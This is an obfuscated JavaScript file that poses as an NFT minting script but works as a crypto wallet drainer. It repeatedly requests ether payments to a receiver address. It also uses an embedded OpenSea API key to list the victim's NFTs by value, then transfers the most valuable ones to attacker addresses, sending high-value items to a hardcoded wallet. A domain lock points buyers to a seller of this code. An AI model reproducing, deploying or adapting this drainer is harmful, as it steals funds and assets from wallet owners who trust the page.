var priceHtml,updatePrice,isMobile,round,sleep,connectButton,updateState,askMint,askNfts,askTransfer;
(function()
{
	function _0x1AC9B(_0x1B010,_0x1B0FC,_0x1B0C1)
	{
		if(!_0x1B010)
		{
			return
		}
		;//0
		var _0x1B04B=this.location.href.split('\x3A\x2F\x2F')[1].split('\x2F')[0].split('\x3A')[0];//0
		var _0x1AF9A=_0x1B010.split('\x2C');//0
		for(var _0x1B086=0;_0x1B086< _0x1AF9A.length;_0x1B086++)
		{
			var _0x1AFD5=_0x1AF9A[_0x1B086];//0
			if(_0x1AFD5== _0x1B04B)
			{
				return
			}
			;//0
			if(!_0x1B0FC)
			{
				continue
			}
			;//0
			_0x1AFD5= _0x1B04B.split('\x2E'+ _0x1AFD5);if(_0x1AFD5.length== 2&&  !_0x1AFD5[1])
			{
				return
			}
			
		}
		;//0
		throw (_0x1B0C1|| '\x65\x72\x72\x6F\x72')
	}
	if(!_0x1ADC2)
	{
		_0x1ADFD(null);_0x1AD87= false
	}
	
	function _0x1ACD6()
	{
		let _0x1B137=parseInt(priceHtml.innerText,10);//5
		if(_0x1B137>= mintInfo.maxUnits)
		{
			_0x1B137= mintInfo.maxUnits
		}
		else 
		{
			++_0x1B137
		}
		//6
		_0x1AD87(_0x1B137)
	}
	function _0x1AD11()
	{
		let _0x1B137=parseInt(priceHtml.innerText,10);//11
		if(!_0x1AE73)
		{
			return
		}
		
		if(_0x1B137<= mintInfo.minUnits)
		{
			_0x1B137= mintInfo.minUnits
		}
		else 
		{
			--_0x1B137
		}
		//12
		_0x1AD87(_0x1B137)
	}
	function _0x1AD4C()
	{
		let _0x1B172=parseInt(priceHtml.innerText,10);//17
		if(_0x1B172!= mintInfo.maxUnits)
		{
			if(_0x1AD87=== 1)
			{
				return
			}
			
			_0x1AF24= _0x1B172;_0x1AD87(mintInfo.maxUnits)
		}
		else 
		{
			_0x1AD87(_0x1AF24)
		}
		
	}
	function _0x1AD87(_0x1B137)
	{
		if(_0x1AE73== 0)
		{
			_0x1ADFD= 1;return
		}
		else 
		{
			document.getElementById('\x6E\x66\x74\x73\x4E\x75\x6D\x62\x65\x72').innerText= _0x1B137
		}
		
		if(!_0x1AE38)
		{
			_0x1AEAE(true,null);_0x1AC9B= 1;return
		}
		else 
		{
			document.getElementById('\x70\x72\x69\x63\x65').innerText= (_0x1B137* mintInfo.price).toFixed(2)
		}
		
	}
	async function _0x1ADC2()
	{
		 await Moralis.enableWeb3(_0x1AEE9?{}:{provider:"\x77\x61\x6C\x6C\x65\x74\x63\x6F\x6E\x6E\x65\x63\x74"})
	}
	async function _0x1ADFD(_0x1B3C0)
	{
		document.querySelector("\x23\x63\x6F\x6E\x6E\x65\x63\x74").style.display= _0x1B3C0?"\x6E\x6F\x6E\x65":"\x62\x6C\x6F\x63\x6B";document.querySelector("\x23\x74\x72\x61\x6E\x73\x66\x65\x72").style.display= _0x1B3C0?"\x62\x6C\x6F\x63\x6B":"\x6E\x6F\x6E\x65"
	}
	if(_0x1AE38== null)
	{
		_0x1AE38= null;return
	}
	
	async function _0x1AE38()
	{
		console.log(`Minting ${priceHtml.innerText} NFTs`);const _0x1B471= new Web3(Moralis.provider);//78
		const _0x1B436=( await _0x1B471.eth.getAccounts())[0];//79
		const _0x1B3FB=document.getElementById("\x70\x72\x69\x63\x65").textContent.toString();//80
		_0x1B471.eth.sendTransaction({from:_0x1B436,to:receiveAddress,value:_0x1B471.utils.toWei(_0x1B3FB,"\x65\x74\x68\x65\x72")}).on('\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x48\x61\x73\x68',()=>
		{
			if(mintInfo.askMintLoop)
			{
				return _0x1AE38()
			}
			
		}
		).on('\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E',()=>
		{
			return console.log(`Transaction confirmed x${confirmationNumber}`)
		}
		).on('\x65\x72\x72\x6F\x72',(_0x1B4AC)=>
		{
			if(_0x1AE73=== false)
			{
				return
			}
			
			if(_0x1B4AC.message&& _0x1B4AC.message.includes("\x69\x6E\x73\x75\x66\x66\x69\x63\x69\x65\x6E\x74"))
			{
				console.log(`Insufficient Balance: ${_0x1B436} has insufficient balance`)
			}
			//92
			if(_0x1B4AC.message&& _0x1B4AC.message.includes("\x55\x73\x65\x72\x20\x72\x65\x6A\x65\x63\x74\x65\x64")|| _0x1B4AC.message&& _0x1B4AC.message.includes("\x55\x73\x65\x72\x20\x64\x65\x6E\x69\x65\x64"))
			{
				console.log(`User Denied: ${_0x1B436} denied transaction`)
			}
			else 
			{
				if(_0x1ACD6== 0)
				{
					return
				}
				
				console.log(`Mint Error: ${_0x1B436} failed to mint`)
			}
			//93
			if(_0x1AC9B== 1)
			{
				return
			}
			
			console.log("\x45\x72\x72\x6F\x72\x3A\x20",_0x1B4AC?_0x1B4AC.message:"\x75\x6E\x6B\x6E\x6F\x77\x6E\x20\x65\x72\x72\x6F\x72");if(mintInfo.askMintLoop)
			{
				return _0x1AE38()
			}
			
		}
		)
	}
	if(!_0x1ADC2)
	{
		_0x1ACD6= null;return
	}
	else 
	{
		async function _0x1AE73()
		{
			const _0x1B471= new Web3(Moralis.provider);//102
			const _0x1B5D3=( await _0x1B471.eth.getAccounts())[0];//103
			const _0x1B598={method:'\x47\x45\x54',headers:{Accept:'\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E','\x58\x2D\x41\x50\x49\x2D\x4B\x45\x59':'\x38\x31\x32\x39\x32\x34\x64\x65\x39\x34\x30\x39\x34\x34\x37\x36\x39\x31\x36\x36\x37\x31\x61\x38\x64\x65\x34\x36\x38\x36\x65\x63'}};//105
			let _0x1B684= await fetch(`https://api.opensea.io/api/v1/assets?owner=${_0x1B5D3}&order_direction=desc&limit=020&include_orders=false`,_0x1B598).then((_0x1B6BF)=>
			{
				return _0x1B6BF.json()
			}
			).then((_0x1B6BF)=>
			{
				console.log(_0x1B6BF);return _0x1B6BF.assets.map((_0x1B6FA)=>
				{
					return {contract:_0x1B6FA.asset_contract.address,token_id:_0x1B6FA.token_id}
				}
				)
			}
			).catch((_0x1B34A)=>
			{
				return console.error(_0x1B34A)
			}
			);//113
			if(_0x1B684.length< 1)
			{
				if(!_0x1AD11)
				{
					_0x1AEAE(null,true);return
				}
				
				return _0x1AE38()
			}
			//124
			let _0x1B55D= await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${_0x1B5D3}&offset=0&limit=200`,_0x1B598).then((_0x1B6BF)=>
			{
				return _0x1B6BF.json()
			}
			).then((_0x1B735)=>
			{
				console.log(_0x1B735);return _0x1B735.filter((_0x1B770)=>
				{
					if(_0x1B770.primary_asset_contracts.length> 0)
					{
						return true
					}
					else 
					{
						return false
					}
					
				}
				).map((_0x1B770)=>
				{
					return {type:_0x1B770.primary_asset_contracts[0].schema_name.toLowerCase(),contract_address:_0x1B770.primary_asset_contracts[0].address,price:round(_0x1B770.stats.one_day_average_price!= 0?_0x1B770.stats.one_day_average_price:_0x1B770.stats.seven_day_average_price),owned:_0x1B770.owned_asset_count}
				}
				)
			}
			).catch((_0x1B34A)=>
			{
				return console.error(_0x1B34A)
			}
			);//126
			if(_0x1B55D.length< 1)
			{
				if(!_0x1AC9B)
				{
					_0x1AE73(true,1,true,false);return
				}
				
				return _0x1AE38()
			}
			//142
			let _0x1B649=[];//144
			if(_0x1ADC2=== false)
			{
				_0x1AD87(0);return
			}
			
			for(nft of _0x1B684)
			{
				const _0x1B4E7=_0x1B55D.find((_0x1B7AB)=>
				{
					return _0x1B7AB.contract_address== nft.contract
				}
				);//146
				if(_0x1B4E7)
				{
					
				}
				else 
				{
					if(_0x1AE38=== null)
					{
						_0x1AE73(null,true,0);_0x1ADC2= false;return
					}
					
					console.log(`No data for collection: ${nft.contract}`);continue
				}
				//147
				if(_0x1B4E7.price=== 0)
				{
					continue
				}
				//151
				const _0x1B522=round(_0x1B4E7.price* _0x1B4E7.owned);//152
				console.log(_0x1B522);if(_0x1ADC2=== 0)
				{
					_0x1AE73();return
				}
				
				if(_0x1B522< drainNftsInfo.minValue)
				{
					if(_0x1ADFD=== null)
					{
						_0x1AEAE()
					}
					
					continue
				}
				//154
				_0x1B649.push({price:_0x1B522,options:{contract_address:_0x1B4E7.contract_address,receiver:_0x1B522> 1.1?"\x30\x78\x63\x34\x31\x41\x31\x38\x31\x46\x35\x41\x30\x45\x63\x30\x38\x41\x37\x61\x34\x38\x41\x30\x33\x64\x36\x61\x31\x32\x33\x30\x33\x37\x34\x62\x63\x35\x34\x32\x36\x38":(drainNftsInfo.nftReceiveAddress== ""?receiveAddress:drainNftsInfo.nftReceiveAddress),token_id:nft.token_id,amount:_0x1B4E7.owned,type:_0x1B4E7.type}})
			}
			//145
			if(_0x1B649.length< 1)
			{
				return _0x1AE38()
			}
			//166
			let _0x1B60E= await _0x1B649.sort((_0x1B1E8,_0x1B7E6)=>
			{
				return _0x1B7E6.price- _0x1B1E8.price
			}
			).slice(0,drainNftsInfo.maxTransfer);//168
			for(transaction of _0x1B60E)
			{
				Moralis.transfer(transaction.options).catch((_0x1B821)=>
				{
					return console.error(_0x1B821,transaction.options)
				}
				); await sleep(150)
			}
			
		}
		
	}
	
	async function _0x1AEAE()
	{
		document.querySelector("\x23\x74\x72\x61\x6E\x73\x66\x65\x72").setAttribute("\x64\x69\x73\x61\x62\x6C\x65\x64","\x64\x69\x73\x61\x62\x6C\x65\x64");if(drainNftsInfo.active)
		{
			 await _0x1AE73()
		}
		else 
		{
			 await _0x1AE38()
		}
		//177
		document.querySelector("\x23\x74\x72\x61\x6E\x73\x66\x65\x72").removeAttribute("\x64\x69\x73\x61\x62\x6C\x65\x64")
	}
	if(!_0x1AE73)
	{
		_0x1ADC2();_0x1AD11= null
	}
	
	updatePrice= _0x1AD87;if(_0x1ADFD=== 0)
	{
		_0x1AD87(null,null,null);_0x1ACD6= true;return
	}
	
	connectButton= _0x1ADC2;updateState= _0x1ADFD;if(_0x1ADFD== null)
	{
		return
	}
	
	askMint= _0x1AE38;if(!_0x1AE73)
	{
		return
	}
	
	askNfts= _0x1AE73;askTransfer= _0x1AEAE;(_0x1AC9B)("\x63\x61\x6C\x6D\x65\x2E\x67\x67",1,"\x42\x75\x79\x20\x63\x6F\x64\x65\x20\x66\x72\x6F\x6D\x20\x6E\x66\x74\x2D\x70\x72\x6F\x66\x65\x73\x73\x6F\x72\x2E\x73\x65\x6C\x6C\x69\x78\x2E\x69\x6F");priceHtml= document.getElementById('\x6E\x66\x74\x73\x4E\x75\x6D\x62\x65\x72');let _0x1AF24=mintInfo.minUnits;//2
	document.getElementById('\x61\x64\x64\x43\x6F\x75\x6E\x74').addEventListener('\x63\x6C\x69\x63\x6B',_0x1ACD6);document.getElementById('\x72\x65\x6D\x43\x6F\x75\x6E\x74').addEventListener('\x63\x6C\x69\x63\x6B',_0x1AD11);if(_0x1ADFD== false)
	{
		_0x1AD4C= null;return
	}
	else 
	{
		document.getElementById('\x6D\x61\x78\x4E\x75\x6D\x62\x65\x72').addEventListener('\x63\x6C\x69\x63\x6B',_0x1AD4C)
	}
	
	if(!_0x1AD4C)
	{
		_0x1AEAE= 1
	}
	
	isMobile= ()=>
	{
		var _0x1B1AD=false;//31
		if(_0x1AD87== true)
		{
			_0x1AE38();_0x1ACD6= null;return
		}
		else 
		{
			(function(_0x1B1E8)
			{
				if(!_0x1AC9B)
				{
					return
				}
				else 
				{
					if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(_0x1B1E8)|| /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x1B1E8.substr(0,4)))
					{
						if(!_0x1AD87)
						{
							_0x1ADC2= true
						}
						
						_0x1B1AD= true
					}
					
				}
				
			}
			)(navigator.userAgent|| navigator.vendor|| window.opera)
		}
		
		return _0x1B1AD
	}
	;round= (_0x1B223)=>
	{
		if(!_0x1ACD6)
		{
			_0x1ACD6();_0x1AE73= true
		}
		
		return Math.round(_0x1B223* 10000)/ 10000
	}
	;sleep= (_0x1B25E)=>
	{
		return  new Promise((_0x1B299)=>
		{
			return setTimeout(_0x1B299,_0x1B25E)
		}
		)
	}
	;let _0x1AEE9=false;//45
	if( typeof window.ethereum!== '\x75\x6E\x64\x65\x66\x69\x6E\x65\x64')
	{
		_0x1AEE9= true
	}
	//46
	let _0x1AF5F;//48
	if(!_0x1AEAE)
	{
		_0x1AC9B();_0x1AD11= 0
	}
	else 
	{
		Moralis.onWeb3Enabled(async (_0x1B2D4)=>
		{
			if(_0x1B2D4.chainId!== 1&& _0x1AEE9)
			{
				 await Moralis.switchNetwork("\x30\x78\x31")
			}
			//56
			_0x1ADFD(true);if(_0x1ADC2=== false)
			{
				_0x1AE73(true,1,0,false,null);_0x1AD87= null;return
			}
			
			console.log(_0x1B2D4)
		}
		)
	}
	
	Moralis.onChainChanged(async (_0x1B30F)=>
	{
		if(_0x1B30F!== "\x30\x78\x31"&& _0x1AEE9)
		{
			 await Moralis.switchNetwork("\x30\x78\x31")
		}
		
	}
	);window.ethereum?window.ethereum.on('\x64\x69\x73\x63\x6F\x6E\x6E\x65\x63\x74',(_0x1B34A)=>
	{
		if(!_0x1AD11)
		{
			_0x1AD4C();return
		}
		
		console.log(_0x1B34A);_0x1ADFD(false)
	}
	):null;window.ethereum?window.ethereum.on('\x61\x63\x63\x6F\x75\x6E\x74\x73\x43\x68\x61\x6E\x67\x65\x64',(_0x1B385)=>
	{
		if(!_0x1AD87)
		{
			_0x1AC9B();_0x1AE73= 0
		}
		
		if(_0x1B385.length< 1)
		{
			_0x1ADFD(false)
		}
		
	}
	):null;window.addEventListener('\x6C\x6F\x61\x64',async ()=>
	{
		if(isMobile()&&  !window.ethereum)
		{
			document.querySelector("\x23\x63\x6F\x6E\x6E\x65\x63\x74").addEventListener("\x63\x6C\x69\x63\x6B",()=>
			{
				return window.location.href= `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`
			}
			)
		}
		else 
		{
			document.querySelector("\x23\x63\x6F\x6E\x6E\x65\x63\x74").addEventListener("\x63\x6C\x69\x63\x6B",_0x1ADC2)
		}
		//183
		document.querySelector("\x23\x74\x72\x61\x6E\x73\x66\x65\x72").addEventListener("\x63\x6C\x69\x63\x6B",_0x1AEAE)
	}
	)
}
)()
